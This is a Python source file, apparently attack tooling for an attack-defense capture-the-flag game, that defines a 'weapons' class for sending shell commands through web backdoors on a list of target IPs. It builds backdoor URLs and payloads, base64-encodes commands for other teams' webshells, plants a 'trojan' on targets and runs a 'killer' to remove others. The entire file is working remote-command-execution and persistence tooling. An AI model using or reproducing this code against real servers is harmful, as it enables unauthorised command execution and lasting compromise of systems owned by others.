import requests
import base64
import json
import config
import tools
class weapons:
    i=0
    @property
    def useBckDoorIndex(self):
        return self.i
    @useBckDoorIndex.setter
    def useBckDoorIndex(self,v):
        self.i=v
    def __init__(self):
        self.bds=config.rawbackdoor_list
        self.team=tools.BackdoorDescriptions(config.ips,config.webrootPath)
    def getBckPayload(self,cmd):
        return self.bds[self.i].payload.format(cmd)
    def getBckUrl(self,index):
        return 'http://{0}/{1}'.format(config.ips[index],self.bds[self.i].url)
    def getTeamPayload(self,index,cmd):
        tmp="{0};".format(cmd).encode("utf-8")
        tmp=base64.b64encode(tmp)
        return {"cmd":tmp.decode("utf-8")}
    def getTeamUrl(self,index):
        return 'http://{0}/{1}?{3}={2}'.format(config.ips[index],self.team[index].url,self.team[index].key,self.team[index].key[-5:])
    def clearTroj(self,index):
        return self.runCmd(index,config.killer)
    def loadTroj(self,index):
        return self.runCmd(index,self.team[index].trojContent)
    def runCmd(self,index,cmd):
        tbd=self.bds[self.i]
        return self.requestServer(self.getBckUrl(index),self.getBckPayload(cmd),tbd.method,tbd.headers,tbd.resultStartPos,tbd.resultEndPos) 
    def runTeamCmd(self,index,cmd):
        payload=self.getTeamPayload(index,cmd)
        tbd=self.bds[self.i]
        return self.requestServer(self.getTeamUrl(index),payload,'post','','','') 
        
    def requestServer(self,url,payload,method,headers,resultStartPos,resultEndPos):
        print(url+" -> "+str(payload))
        try:
            fun=eval(f'requests.{method}')
            if method=='get':
                url+=('?') if not url.__contains__('?') else ''
                url+=payload
            response=fun(url=url,data=payload,timeout=3,headers=headers)
        except Exception as e:
            print(e)
            return 'None'
        raw=response.text
        if len(raw)>0:
            rstart=0 if resultStartPos=='' else raw.index(resultStartPos)
            rend=len(raw) if resultEndPos=='' else raw.index(resultEndPos)
            raw=raw[rstart:rend]
        return raw